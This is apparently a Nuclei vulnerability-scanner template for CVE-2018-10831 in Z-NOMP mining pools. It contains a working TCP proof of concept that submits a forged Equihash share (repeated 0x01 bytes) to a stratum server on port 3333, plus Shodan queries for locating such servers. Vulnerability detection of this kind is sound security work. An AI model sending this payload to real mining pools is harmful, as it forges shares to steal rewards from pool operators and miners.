id: CVE-2018-10831

info:
  name: Z-NOMP Equihash Solution Verifier Spoofing (CVE-2018-10831)
  author: princechaddha
  severity: high
  description: |
    Z-NOMP before 2018-04-05 contains an incorrect Equihash solution verifier caused by flawed validation logic, letting attackers spoof mining shares by providing crafted solutions with x1..x512 set to 1.
  impact: |
    A vulnerable Z-NOMP stratum server may accept forged mining shares, allowing an attacker to fake computational power and steal rewards from mining pools.
  remediation: Update Z-NOMP to a fixed version after 2018-04-05 or apply vendor-provided patches that validate Equihash solutions correctly.
  reference:
    - https://github.com/edwardz246003/misc/blob/master/Attackers%20Fake%20Computational%20Power%20to%20Steal%20Cryptocurrencies%20from%20Mining%20Pools.md
    - https://nvd.nist.gov/vuln/detail/CVE-2018-10831
  classification:
    cve-id: CVE-2018-10831
    cwe-id: CWE-20

  metadata:
    max-request: 3
    verified: false
    kev: true
    shodan-query:
      - "port:3333"
      - "stratum"

  tags: network,cve2018,cve,z-nomp,equihash,crypto,miner,kev,tcp,vuln

# Active PoC: send a crafted mining.submit with a forged Equihash solution (x1..x512 = 1)
# The template sends a subscribe/authorize then a submit with a solution of 512 bytes of 0x01 encoded as hex ('01' * 512).
# This template also includes a small mock vulnerable server in docker/ for triage and reproducible testing.

tcp:
  - host:
      - "{{Hostname}}"
    port: 3333
    input:
      - data: "{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[\"nuclei\"]}\n"
        read: 1024
      - data: "{\"id\":2,\"method\":\"mining.authorize\",\"params\":[\"nuclei\",\"x\"]}\n"
        read: 1024
      # Crafted Equihash solution: 512 bytes each 0x01, hex encoded string of '01' repeated 512 times (1024 hex chars)
      - data: "{\"id\":4,\"method\":\"mining.submit\",\"params\":[\"nuclei\",\"0\",\"00000000\",\"00000000\",\"00000000\",\"0101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101\"}\n"
        read: 1024
    matchers:
      - type: regex
        regex:
          - '"result"\s*:\s*true'
          - '"status"\s*:\s*"?OK"?'
          - '"error"\s*:\s*null'
      - type: word
        words:
          - accepted
        condition: or

# Notes
# - This template performs an active verification (does not rely solely on version detection) and is intended to be used against systems you own or are authorized to test.
# - Use `-debug` when running nuclei to collect debug data for triage.
# - A small mock vulnerable server and docker setup are included under docker/CVE-2018-10831 to help reviewers validate the template in a safe environment.

# digest: TODO
